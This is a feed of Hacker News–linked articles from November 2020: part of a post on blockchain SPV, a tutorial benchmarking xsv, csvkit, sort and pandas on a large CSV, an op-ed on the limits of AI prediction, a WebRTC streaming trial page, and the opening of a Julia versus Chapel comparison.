Instead of making nodes download every block in a blockchain, a lightweight node downloads only the block headers. That way, instead of having to store every transaction, one simply stores the previous block hash, a nonce (a value needed for PoW, and a <strong>Merkle root</strong> (a specific hash). This alone cuts the storage costs significantly. Having locally stored the block headers of a chain, a lightweight node can easily prove if a transaction really occurred by requesting a <strong>Merkle proof</strong>, also known as a <strong>Merkle path</strong>.</p>

<p>
  <img width="700" height="700" src="https://lums.blog/assets/images/posts/2020/spv.png">
  <em><br>Figure 1. An illustration of how block headers are structured. Taken from the Bitcoin whitepaper.</em>
</p>

<p>To understand what exactly a Merkle root and a Merkle proof really are, we have to know how a <strong>Merkle tree</strong> works. A Merkle tree is a binary tree in which all leaf nodes (i.e. the Merkle tree’s elements, i.e. the block’s transactions) are associated with a cryptographic hash, and all none-leaf nodes are associated with a cryptographic hash, that is formed from the hashes of its child nodes, as shown in figure two.</p>

<p>
  <img width="450" height="450" src="https://lums.blog/assets/images/posts/2020/mt.jpg">
  <em><br>Figure 2. An illustration of Merkle tree. The leaf nodes represent a block's transactions. After the hashing process, a root hash is generated, also known as a Merkle root.</em>
</p>

<p>Now when a lightweight node wants to know if a transaction really occurred, instead of having to request all block transactions to generate the block hash, one simply needs a subset of the hashes, as shown in orange in figure 3. Having those hashes, and having the block headers stored locally, a lightweight node can recreate the Merkle root and thus know if a transaction really occurred.</p>

<p>
  <img width="450" height="450" src="https://lums.blog/assets/images/posts/2020/mp.jpg">
  <em><br>Figure 3. An illustration of Merkle tree and a Merkle proof (shown in orange) for a given transaction hash (shown in blue).</em>
</p>

<p>And that’s all simplified payment verification really is. It’s a neat idea that allows the casual user still to participate in a blockchain network, without having to download hundreds of gigabytes and validate every transaction for themselves. There is though a catch that makes today’s SPV less useful than people might think.</p>

<h2 id="the-shortcomings-of-spv">The shortcomings of SPV</h2>
<p>Back in 2019 there was a lot of fuss on Twitter around chapter 8 of Bitcoin’s whitepaper, the chapter that introduces the concept of SPV. It turned out that different people define the implementation of SPV differently. For convenience, for figure 4., I am going to use Donald Mulders’ illustration from his <a href="https://metanet.id/simplified-payment-verification-spv/">blog</a> post to clarify the difference.</p>

<p>
  <img width="450" height="450" src="https://lums.blog/assets/images/posts/2020/spv_variants.jpg">
  <em><br>Figure 4. Two ways how SPV can be implemented.</em>
</p>

<p>The left model visualizes how most SPV implementations work today. Alice sends a transaction to the blockchain network, it gets included to the chain, Bob can verify that it was included, and he can see that other blocks are added on top of Alice’s transaction. Bob cannot validate the transaction for himself, but as long as the honest nodes represent the majority in the network, he can know that Alice’s transaction was validated and inserted to the chain by the network’s full nodes. Unlike Craig Wright’s claims, it’s quite clear that the left model was originally described in the Bitcoin Whitepaper. Below is a screenshot of the part of the paper for you to read and compare it for yourself with the two models shown in figure 4.</p>

<p>
  <img width="450" height="450" src="https://lums.blog/assets/images/posts/2020/spv_whitepaper_screenshot.jpg">
  <em><br>Figure 5. Screenshot of chapter 8 of the Bitcoin whitepaper.</em>
</p>

<p>The second model (the model on the right of figure 4) is the model that Craig says is what he really meant when “writing the Bitcoin whitepaper”. Here, instead of Alice having to be connected to the blockchain network, she can simply spend her transaction directly with Bob. Bob can then send the transaction to the network and check if it’s valid. Before criticizing this model, I first want to mention it’s advantages: In this model, Alice does not have to be connected to the network at all to spend her coins. This is quite a huge advantage in my opinion. She can simply send the transaction, as well as the necessary Merkle paths to Bob directly, she doesn’t even have to have an internet connection necessarily. Bob can then check if the right Merkle root of a block header can be created from Alice’s spent transaction(s) and provide the service / product to Alice right away. Bob can then send the transaction to the network for it to be included in the chain. He is in fact incentivized to transmit it to the network as soon as possible, as Alice might spend the same coins later somewhere else.</p>

<p>But wait, according to the model in figure four, there’s also a verification step Bob has to perform with the blockchain network. Well, and that’s where the catch with the right model is. In SPV, even if you get a correct Merkle proof that “locks” a specific transaction with a block header, there’s no way for the lightweight node to know if that transaction was already spend or not. To clarify this last statement a bit, imagine let’s imagine a scenario with Alice and Bob again. Alice received some bitcoin at block number 1000. She then spent her coins at block 1010 for some reason. Now let’s say Bob is a lightweight node following Craigh’s model from figure 4 (the one at the right). Alice could fool Bob by sending him the Merkle proof of the already spent coins from block 1000. Bob would receive the proof, see that Alice really had that many coins at block 1000, and accept it as true. SPV can only show that a transaction really occurred in the chain, it cannot prove that it is still unspent. That’s why in this model, Bob has to communicate with a number of nodes and get their validation that the transaction is unspent. This however is done in a trustful way, i.e. Bob has to contact a bunch of full nodes and hope that the majority will be honest. Note, this is only the case if the chain is based on a <a href="https://en.wikipedia.org/wiki/Unspent_transaction_output">UTXO</a> model, an <a href="https://blockonomi.com/utxo-vs-account-based-transaction-models/">account-based</a> model, like in Ethereum, Bob could get the proof of Alice’s latest account state. Craigh’s model then is not really <strong>trustless</strong>, and of course he knows that. That’s why he will often say things such as “It is important to note that network miners act within the law” and “It is so because Bitcoin is not designed to be a system that acts outside of the controls of law”. This kind of thinking though doesn’t really align well with the “crypto ethos”. It might just be me, but I don’t really see what’s the point of having all the cryptographic intermediary steps, if at the end of the day you still need to trust full nodes in a non-cryptographic way.</p>

<p>Now that this is out of the way, let’s focus on the interesting things: Thee scaling …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lums.blog/scaling-blockchains-part1-ibp">https://lums.blog/scaling-blockchains-part1-ibp</a></em></p>]]>
            </description>
            <link>https://lums.blog/scaling-blockchains-part1-ibp</link>
            <guid isPermaLink="false">hacker-news-small-sites-25020616</guid>
            <pubDate>Sat, 07 Nov 2020 23:06:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Clean CSV Data at the Command Line – Part 2]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25020262">thread link</a>) | @ethink
<br/>
November 7, 2020 | https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line-part-2 | <a href="https://web.archive.org/web/*/https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line-part-2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>In the last blog post, we proved that <a href="https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line">xsv is ~1882x faster than csvkit</a> when joining two CSVs and saw how performant xsv is and when we can use <a href="https://github.com/BurntSushi/xsv" target="_blank">xsv</a> or <a href="https://csvkit.readthedocs.io/en/latest/" target="_blank">csvkit</a> when we are at the terminal.</p><p>Today, we're talking about part 2 of cleaning CSV data at the command line investigating a large CSV&nbsp;file (from&nbsp;Kaggle)&nbsp;that contains <a href="https://www.kaggle.com/colinmorris/reddit-usernames">~26 million users and their number of comments</a> posted from 2005 to 2017. We also talked about <a href="https://www.ezzeddinabdullah.com/posts/how-to-clean-text-data-at-the-command-line">cleaning text files in general using the command line</a> if you want to check out.</p><h2>Prerequisites</h2><p>You just need to install <strong>csvkit </strong>and <strong>xsv </strong>with the following commands:</p><h3>install csvkit</h3><p>Just need pip to be able to install csvkit:</p><h3>install xsv</h3><p>Binaries for Windows, Linux and macOS are available <a href="https://github.com/BurntSushi/xsv/releases/latest">from Github</a>.</p><p>Or if you're using macOS&nbsp;Homebrew, install it just like this:</p><p>Compiling from its repository also works similarly:<br></p><div><pre>$ git clone git://github.com/BurntSushi/xsv
$ cd xsv
$ cargo build --release
</pre></div><p>but you need to have <a href="https://crates.io/install">Cargo installed </a>which is Rust's package manager since xsv is written in Rust</p><h2>Concatenating: xsv cat vs csvstack</h2><p>Let's first create a CSV file to play with instead of the large&nbsp;file. Create it with your favorite text editor or just at the command line:</p><div><pre>$ cat &gt;&gt; fake_users.csv
author,n
x,5
z,7
y,6

</pre></div><p>Here, we’d like to concatenate this <strong>fake_users.csv </strong>file with the large <strong>users.csv </strong>file.</p><p>To see the effect of the performance here, we will stack the large file first because that will be more accurate when using <strong>tail</strong> to validate that the second file is already read into memory and concatenated.</p><p><strong>xsv </strong>has a tool for that which is <strong>cat</strong>, let's use it:</p><div><pre>$ time xsv cat rows users.csv fake_users.csv | tail
youbd636,1
generalkickstand,1
Throwaway_injuries,5
LowlzMan,3
ImSoLitBroLMFAO,1
i_want_to_die_killme,2
beeman3459,1
x,5
z,7
y,6

real	0m15.198s
user	0m17.499s
sys	0m0.364s
</pre></div><ul role="list"><li><strong>rows </strong>here is used to indicate that we will concatenate the rows so the rows of the second file will be appended to the rows of the first file</li></ul><p>Time here taken by <strong>xsv cat </strong>is ~15s</p><p><strong>csvkit </strong>also has a <strong>csvstack </strong>tool, let’s see it:</p><div><pre>$ time csvstack users.csv fake_users.csv | tail
youbd636,1
generalkickstand,1
Throwaway_injuries,5
LowlzMan,3
ImSoLitBroLMFAO,1
i_want_to_die_killme,2
beeman3459,1
x,5
z,7
y,6

real	1m7.213s
user	1m21.464s
sys	0m1.026s
</pre></div><p>Time here taken by <strong>csvstack </strong>is ~1.7mins </p><p>So approximately, <strong>xsv </strong>is ~7x faster here than <strong>csvkit</strong></p><h2>Sorting: pandas.sort_values() vs xsv sort vs GNU&nbsp;sort vs csvsort</h2><p>Let’s first see how <strong>csvsort </strong>and <strong>xsv sort </strong>work by sorting <em>fake_users.csv </em>by the number of comments <em>n</em>:</p><div><pre>$ csvsort -c n fake_users.csv
author,n
x,5
y,6
z,7
</pre></div><p>We can also sort in reverse order by setting the option <strong>-r:</strong></p><div><pre>$ csvsort -rc n fake_users.csv
author,n
z,7
y,6
x,5
</pre></div><p>The equivalent <strong>xsv</strong> command is:</p><div><pre>$ xsv sort -RNs n fake_users.csv 
</pre></div><p><strong>-RNs </strong>is a combination of: </p><ul role="list"><li><strong>-R </strong>for reverse order</li><li><strong>-N&nbsp;</strong>for numeric sorting</li><li><strong>-s </strong>for selecting the column that you sort by</li></ul><p>After downloading <strong>users.csv</strong>,<strong> </strong>the ~359MB CSV file, let's sort it with <strong>xsv </strong>first. This is a +25 million records so expect a latency here!</p><div><pre>$ time xsv sort -RNs n users.csv &gt; /dev/null

real	1m48.611s
user	1m27.743s
sys	0m16.621s
</pre></div><p>So <strong>xsv sort </strong>took here ~1.4 mins for this much data.</p><p>Let's try the <strong>sort </strong>command coming with the UNIX system:</p><div><pre>$ time sort -t, -rnk2 users.csv &gt; /dev/null

real	6m29.940s
user	5m49.416s
sys	0m32.340s
</pre></div><ul role="list"><li><strong>-t, </strong>to determine the field separator which is comma here as the file is a CSV file</li><li><strong>-r</strong> for reverse order<strong>‍</strong></li><li><strong>-n </strong>for numeric sorting </li><li><strong>-k2 </strong>for setting the key field (the column that you sort by which is the second column here)</li></ul><p>Here <strong>BSD&nbsp;sort </strong>took ~6.3min which is ~5x slower than <strong>xsv</strong></p><p>What about <strong>csvsort</strong>? </p><div><pre>$ time csvsort -rc n users.csv &gt; /dev/null
</pre></div><p>Do you know that I have terminated my terminal after <strong>more than an hour</strong> of waiting for this command to complete execution and it's not completed yet!</p><p>Knowing that <strong>csvkit </strong>is written in pure python can somehow proves that it's not advisable to write a very performant tool with such technology alone unless you use C or Cython with Python as <strong>Pandas</strong> did:</p><div><pre>$ python sort_with_pandas.py
Time: 77.732413994
</pre></div><p><strong>Pandas</strong> here beats ALL, <strong>csvkit</strong>, <strong>BSD&nbsp;sort</strong>, and even <strong>xsv </strong>with execution time of ~78 seconds which means it's very close to <strong>xsv </strong>result (1.4min = 84s) so just 6 seconds difference and with each run, the time varies so it's acceptable for <strong>xsv </strong>to be competing with <strong>pandas </strong>for performance.</p><h2>Final thoughts</h2><p>From our investigation of the 26 million records data of the Reddit username data, it seems that <strong>xsv</strong> is the fastest command line I ever used and I think ever existed at the terminal. It is more performant than <strong>csvkit</strong>. We’ve seen a tremendous improvement in speed when cleaning our data by:</p><ul role="list"><li>concatenating the rows of the CSV files using <strong>xsv cat rows </strong>and comparing it with <strong>csvstack</strong>‍</li><li>sorting by a column and in a reverse order using <strong>xsv sort -sRN </strong>comparing it with <strong>csvsort -rc</strong></li><li>also comparing the two utilities with <strong>BSD&nbsp;sort </strong>and <strong>pandas </strong>resulting in a very good performing of pandas and xsv</li></ul><p>In the end, as always you have the choice to choose whatever you want from the <strong>csvkit </strong>or <strong>xsv </strong>but it'd be fair to use what makes our life easy which is <strong>xsv </strong>especially when we're dealing with a large CSV file like what we saw today and if speed and performance are not what we look for especially when we're dealing with small CSVs, we can go for <strong>csvkit</strong>.</p><p>You might have noticed that the syntax is kind of similar in sorting and stacking. So you always have the choice!</p><p>‍</p><p>This tutorial is mainly motivated by <a href="https://amzn.to/33y5EkR">Data Science at the Command Line</a></p><h6>Disclosure: <em>The Amazon links for the book (in this section) are paid links so if you buy the book, I will have a small commission</em></h6><p>This book tries to catch your attention on the ability of the command line when you do data science tasks - meaning you can obtain your data, manipulate it, explore it, and make your prediction on it using the command line. If you are a data scientist, aspiring to be, or want to know more about it, I&nbsp;highly recommend this book. You can read it online for free from <a href="https://www.datascienceatthecommandline.com/">its website</a> or order an <a href="https://amzn.to/33y5EkR">ebook or paperback</a>.</p><p>‍</p><p>You might be interested in my previous tutorials on <a href="https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line">part 1 of cleaning CSV&nbsp;data</a> or <a href="https://www.ezzeddinabdullah.com/posts/penguins-in-docker-a-tutorial-on-why-we-use-docker">why we use docker tutorial</a> or the one similar to this on<a href="https://www.ezzeddinabdullah.com/posts/how-to-clean-text-data-at-the-command-line"> how to clean text data at the command line</a>‍</p><p>Take care, will see you in the next tutorials :)</p><p><a href="https://upbeat-crafter-1565.ck.page/0f7fd6d5d6"><strong>Click here</strong></a><strong> to get fresh content to your inbox</strong></p><h2>Resources</h2><ul role="list"><li><a href="https://csvkit.readthedocs.io/en/latest/cli.html#processing">csvkit Documentation</a>‍</li><li><a href="https://github.com/BurntSushi/xsv">xsv Repo by the BruntSushi Author</a>‍</li><li><a href="https://www.kaggle.com/colinmorris/reddit-usernames">Reddit Usernames data | Kaggle</a></li><li><a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.sort_values.html">pandas.sort_values()</a>‍</li><li><a href="https://stackoverflow.com/questions/37787698/how-to-sort-pandas-dataframe-from-one-column">how to sort pandas dataframe from one column</a>‍</li><li><a href="https://stackoverflow.com/a/16414144/4604121">How do you calculate program run time in python? [duplicate]</a></li><li>Photo by <a href="https://unsplash.com/@yanots?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Yan Ots</a> on <a href="https://unsplash.com/s/photos/in-order?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></li></ul><p>Please <a href="https://ezzeddinabdullah.medium.com/how-to-clean-csv-data-at-the-command-line-part-2-207215881c34">clap on medium if you like this article</a>, thank you!&nbsp;:)</p></div></div></div></div>]]>
            </description>
            <link>https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line-part-2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25020262</guid>
            <pubDate>Sat, 07 Nov 2020 22:32:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No, AI can’t predict the outcome of the election]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25020157">thread link</a>) | @mrathi12
<br/>
November 7, 2020 | https://mukulrathi.co.uk/ai-wont-predict-the-election/ | <a href="https://web.archive.org/web/*/https://mukulrathi.co.uk/ai-wont-predict-the-election/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p><h3>November 07, 2020</h3><h3>2 min read</h3></p><hr><p>As the pollsters get the outcome of the US election incorrect, there’s the familiar cry of “AI can solve this” in the <a href="https://www.wsj.com/articles/artificial-intelligence-shows-potential-to-gauge-voter-sentiment-11604704009">Wall Street Journal</a>. This fallacy is justified by bombarding the reader with buzzwords and AI jargon.The latest machine learning algorithm seems to model your problem perfectly… until it doesn’t. What then? Perhaps for polling prediction the outcome doesn’t matter, but what if the stakes are higher? What if AI is used in healthcare, or for self-driving cars, where an error could be fatal? Deploying AI poses both socio-technical and security risks which we must handle.</p><p>AI used in academia is detached from practical engineering in one key aspect - the data. AI in the real world does not operate on a large, carefully-curated dataset. Real world data is messy and contains biases. In 2016, Twitter users fed <a href="https://www.theverge.com/2016/3/24/11297050/tay-microsoft-chatbot-racist">Microsoft’s AI chatbot Tay</a> racist, misogynistic tweets and, lo and behold, Tay made racist and misogynistic remarks. Facial recognition datasets under-represented minorities such as African American faces, leading to <a href="http://proceedings.mlr.press/v81/buolamwini18a.html">racial bias in the model</a>. Twitter recently fell foul of this with its intelligent thumbnail selection algorithm.</p><p>Using AI as a service? The dataset that the AI model was pretrained might not match your use case. The startup <a href="https://www.nabla.com/blog/gpt-3/">Nabla used OpenAI’s GPT-3 model to power a healthcare chatbot’s predictions</a>. GPT-3’s training set was a general internet language corpus that lacked the domain-specific knowledge or appropriate ethical standards needed for a healthcare application. The result? GPT-3 recommended that a patient commit suicide. GPT-3 also provided responses that were syntactically correct and sounded impressive, but were factually incorrect.</p><p>We need to stop treating AI as the magic sauce, and instead treat it as just another component in our engineering stack. Just as MongoDB is not the solution to all database problems, neural networks are not the fix for all prediction problems. Despite being one of the leading AI research labs, <a href="https://deepmind.com/blog/article/streams-and-ai">DeepMind preferred existing formulae used by medical professionals over machine learning solutions for its Streams app</a>. They chose instead to focus on the underlying issues with delivery of patient care.</p><p>We already battle-test our engineering stack with extensive testing and static analysis to find security vulnerabilities. These security best practices should carry over to our deployment of AI, where the attack surface not only encompasses code, but also the data in the system. Sandbox the model and scan external data for biases as we would scan processes for malware. Use access control mechanisms to ensure models aren’t trained on sensitive data. Incorporate domain-specific error handling around AI model predictions, just as we handle exceptions in code.</p><p>AI is not a panacea. It won’t magically fix the pollster’s predictions. AI might detect cancer better than humans… but it might make mistakes. We’ve been in this situation before, with the software revolution. We’ve developed <a href="https://smallbusinessprogramming.com/safety-critical-software-15-things-every-developer-should-know/#:~:text=Safety%2Dcritical%20systems%20are%20those,of%20safety%2Dcritical%20software%20systems.">safety-critical systems</a> before. The AI revolution is coming, but we need to look past the hype and treat it with the same sceptism we treat other software.</p><div><h3>Join me on this learning journey!</h3><p>I write a mixture of tutorials, comment pieces and technical content on my blog.</p></div></article></div>]]>
            </description>
            <link>https://mukulrathi.co.uk/ai-wont-predict-the-election/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25020157</guid>
            <pubDate>Sat, 07 Nov 2020 22:21:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scalable, Ultra Low Latency and Adaptive WebRTC Streaming Free Server]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25020137">thread link</a>) | @kerrarbone
<br/>
November 7, 2020 | https://antmedia.io/free-trial/ | <a href="https://web.archive.org/web/*/https://antmedia.io/free-trial/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<section>
</section>
<section>
<div>
<div>
<div>
<div> <h2>What Does Your <span>14 days</span> Free Trial Include?</h2> <table> <tbody> <tr> <td>Ultra Low Latency<br> One-to-Many WebRTC Streaming</td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>End-to-End Latency </td> <td>0.5 Seconds (500ms)</td> </tr> <tr> <td>Scaling </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>RTMP(Ingesting) to WebRTC (Playing) </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>Hardware Encoding (GPU) </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>Adaptive Bitrate </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>Secure Streaming </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>iOS &amp; Android WebRTC SDK </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>iOS &amp; Android RTMP SDK </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>H.264,H.265 and VP8 </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>RTMP, RTSP, MP4 and HLS Support </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>WebRTC to RTMP Adapter </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>360 Degree Live &amp; VoD Streams </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>Web Management Dashboard </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>IP Camera Support </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>Re-stream Remote Streams </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>Open Source </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>Simulcasting to Periscope </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>Simulcast to Facebook &amp; Youtube </td> <td><img src="https://antmedia.io/img/icons/true-icon.svg"></td> </tr> <tr> <td>Support</td> <td>E-mail, On-site</td> </tr> </tbody> </table></div><div>
<h2><span>Free</span> Trial Sign Up</h2>
<div>
<div id="wpforms-32285"><form id="wpforms-form-32285" data-formid="32285" method="post" enctype="multipart/form-data" action="/free-trial/" data-token="7f640deef2017ce6ea547b02202f2e0e"><div><div id="wpforms-32285-field_0-container" data-field-id="0"><p><label for="wpforms-32285-field_0">Name <span>*</span></label></p><div><p><label for="wpforms-32285-field_0">First</label></p><p><label for="wpforms-32285-field_0-last">Last</label></p></div></div><p><label for="wpforms-32285-field_1">Email <span>*</span></label></p><p><label for="wpforms-32285-field_5">Company Name <span>*</span></label></p></div></form></div></div></div></div></div></div></section></div></div>]]>
            </description>
            <link>https://antmedia.io/free-trial/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25020137</guid>
            <pubDate>Sat, 07 Nov 2020 22:20:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Should I use Chapel or Julia for my next project?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25020131">thread link</a>) | @spekcular
<br/>
November 7, 2020 | https://www.dursi.ca/post/julia-vs-chapel.html | <a href="https://web.archive.org/web/*/https://www.dursi.ca/post/julia-vs-chapel.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
          

          

    		<p><a href="https://julialang.org/">Julia</a> and <a href="http://chapel.cray.com/">Chapel</a>
are both newish languages aimed at productitive scientific computing,
with parallel computing capabilities baked in from the start.
There’s lots of information about both online, but not much comparing
the two.  If you are starting a new scientific computing project
and are willing to try something new, which should you choose?  What
are their strengths and weaknesses, and how do they compare?</p>

<p>Here we walk through a comparison, focusing on distributed-memory
parallelism of the sort one would want for HPC-style simulation.
Both have strengths in largely disjoint areas.  If you want matlib-like
interactivity and plotting, and need only coodinator-worker parallelism,
Julia is the clear winner; if you want MPI+OpenMPI type scability
on rectangular distributed arrays (dense or sparse), Chapel wins
handily.  Both languages and environments have clear untapped
potential and room to grow; we’ll talk about future prospects of
the two languages at the end.</p>

<p><strong>Update</strong>: I’ve updated the timings - I hadn’t been using <code>@inbounds</code>
in the Julia code, and I had misconfigured my Chapel install so
that the compiles weren’t optimized; this makes a huge difference on
the 2d advection problem.  All timings now are on an AWS c4.8x instance.</p>

<ul id="markdown-toc">
  <li><a href="#a-quick-overview-of-the-two-languages" id="markdown-toc-a-quick-overview-of-the-two-languages">A quick overview of the two languages</a>    <ul>
      <li><a href="#julia" id="markdown-toc-julia">Julia</a></li>
      <li><a href="#chapel" id="markdown-toc-chapel">Chapel</a></li>
    </ul>
  </li>
  <li><a href="#similarities-and-differences" id="markdown-toc-similarities-and-differences">Similarities and differences</a>    <ul>
      <li><a href="#standard-library" id="markdown-toc-standard-library">Standard library</a></li>
      <li><a href="#other-packages" id="markdown-toc-other-packages">Other packages</a></li>
      <li><a href="#language-features" id="markdown-toc-language-features">Language features</a></li>
    </ul>
  </li>
  <li><a href="#simple-computational-tasks" id="markdown-toc-simple-computational-tasks">Simple computational tasks</a>    <ul>
      <li><a href="#linear-algebra" id="markdown-toc-linear-algebra">Linear algebra</a></li>
      <li><a href="#stencil-calculation" id="markdown-toc-stencil-calculation">Stencil calculation</a></li>
      <li><a href="#kmer-counting" id="markdown-toc-kmer-counting">Kmer counting</a></li>
    </ul>
  </li>
  <li><a href="#parallel-primitives" id="markdown-toc-parallel-primitives">Parallel primitives</a>    <ul>
      <li><a href="#remote-function-execution" id="markdown-toc-remote-function-execution">Remote function execution</a></li>
      <li><a href="#futures-atomics-and-synchronization" id="markdown-toc-futures-atomics-and-synchronization">Futures, atomics and synchronization</a></li>
      <li><a href="#parallel-loops-reductions-and-maps" id="markdown-toc-parallel-loops-reductions-and-maps">Parallel loops, reductions, and maps</a></li>
      <li><a href="#threading" id="markdown-toc-threading">Threading</a></li>
      <li><a href="#distributed-data" id="markdown-toc-distributed-data">Distributed data</a></li>
      <li><a href="#communications" id="markdown-toc-communications">Communications</a></li>
    </ul>
  </li>
  <li><a href="#a-2d-advection-problem" id="markdown-toc-a-2d-advection-problem">A 2d advection problem</a></li>
  <li><a href="#strengths-weaknesses-and-future-prospects" id="markdown-toc-strengths-weaknesses-and-future-prospects">Strengths, Weaknesses, and Future Prospects</a>    <ul>
      <li><a href="#julia-1" id="markdown-toc-julia-1">Julia</a></li>
      <li><a href="#chapel-1" id="markdown-toc-chapel-1">Chapel</a></li>
    </ul>
  </li>
  <li><a href="#my-conclusions" id="markdown-toc-my-conclusions">My conclusions</a>    <ul>
      <li><a href="#both-projects-are-strong-and-useable-right-now-at-different-things" id="markdown-toc-both-projects-are-strong-and-useable-right-now-at-different-things">Both projects are strong and useable, right now, at different things</a></li>
      <li><a href="#both-projects-have-as-yet-untapped-potential" id="markdown-toc-both-projects-have-as-yet-untapped-potential">Both projects have as-yet untapped potential</a></li>
    </ul>
  </li>
</ul>

<h2 id="a-quick-overview-of-the-two-languages">A quick overview of the two languages</h2>

<h3 id="julia">Julia</h3>

<p>The <a href="https://julialang.org/">Julia project</a> describes Julia as “a
high-level, high-performance dynamic programming language for
numerical computing.”  It exploits type inference of rich types,
just-in-time compilation, and <a href="https://en.wikipedia.org/wiki/Multiple_dispatch">multiple
dispatch</a> (think
of R, with say <code>print()</code> defined to operate differently on scalars,
data&nbsp;frames, or linear regression fits) to provide a dynamic,
interactive, “scripting language”-type high level numerical programming
language that gives performance less than but competitive with
C or Fortran.</p>

<p>The project sees the language as more or less a matlab-killer, and
so focusses on that sort of interface; interactive, through a REPL
or Jupyter notebook (both available to try <a href="https://juliabox.com/">online</a>),
with integrated plotting; also, indexing begins at one, as God
intended.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<table>
<tbody>
<tr>
<td>Example from <a href="https://github.com/dpsanders/scipy_2014_julia">David Sanders’ SciPy 2014 tutorial</a></td>
<td></td>
</tr>
<tr>
<td>

<figure><pre><code data-lang="julia"><span>using</span> <span>PyPlot</span>

<span># julia set</span>
<span>function</span><span> julia</span><span>(</span><span>z</span><span>,</span> <span>c</span><span>;</span> <span>maxiter</span><span>=</span><span>200</span><span>)</span>
    <span>for</span> <span>n</span> <span>=</span> <span>1</span><span>:</span><span>maxiter</span>
        <span>if</span> <span>abs2</span><span>(</span><span>z</span><span>)</span> <span>&gt;</span> <span>4</span>
            <span>return</span> <span>n</span><span>-</span><span>1</span>
        <span>end</span>
        <span>z</span> <span>=</span> <span>z</span><span>*</span><span>z</span> <span>+</span> <span>c</span>
    <span>end</span>
    <span>return</span> <span>maxiter</span>
<span>end</span>

<span>jset</span> <span>=</span> <span>[</span> <span>UInt8</span><span>(</span><span>julia</span><span>(</span><span>complex</span><span>(</span><span>r</span><span>,</span><span>i</span><span>),</span> <span>complex</span><span>(</span><span>-.</span><span>06</span><span>,</span><span>.</span><span>67</span><span>)))</span>
             <span>for</span> <span>i</span><span>=</span><span>1</span><span>:-.</span><span>002</span><span>:-</span><span>1</span><span>,</span> <span>r</span><span>=-</span><span>1.5</span><span>:.</span><span>002</span><span>:</span><span>1.5</span> <span>];</span>
<span>get_cmap</span><span>(</span><span>"RdGy"</span><span>)</span>
<span>imshow</span><span>(</span><span>jset</span><span>,</span> <span>cmap</span><span>=</span><span>"RdGy"</span><span>,</span> <span>extent</span><span>=</span><span>[</span><span>-</span><span>1.5</span><span>,</span><span>1.5</span><span>,</span><span>-</span><span>1</span><span>,</span><span>1</span><span>])</span></code></pre></figure>

</td>
<td>
<img src="https://www.dursi.ca/assets/julia_v_chapel/juliaset_in_julia.png" alt="Julia set plot">
</td></tr>
</tbody>
</table>

<p>Julia blurs the distinction between scientific users of Julia and
developers in two quite powerful ways.  The first is lisp-like
<a href="https://docs.julialang.org/en/stable/manual/metaprogramming/">metaprogramming</a>,
where julia code can be generated or modified from within Julia,
making it possible to build domain-specific langauges (DSLs) inside Julia
for problems; this allows simple APIs for broad problem sets which
nonetheless take full advantage of the structure of the particular
problems being solved; <a href="https://github.com/JuliaStats">JuliaStats</a>,
<a href="https://github.com/JuliaDiffEq/DifferentialEquations.jl">DifferentialEquations.jl</a>,
<a href="https://github.com/JuliaFEM/JuliaFEM.jl">JuliaFEM</a>, and
<a href="https://github.com/JuliaOpt/JuMP.jl">JuMP</a> offer hints of what
that could look like.  Another sort of functionality this enables
is <a href="https://julialang.org/blog/2016/03/parallelaccelerator">Parallel Accellerator</a>, an
intel package that can rewrite some regular array operations into
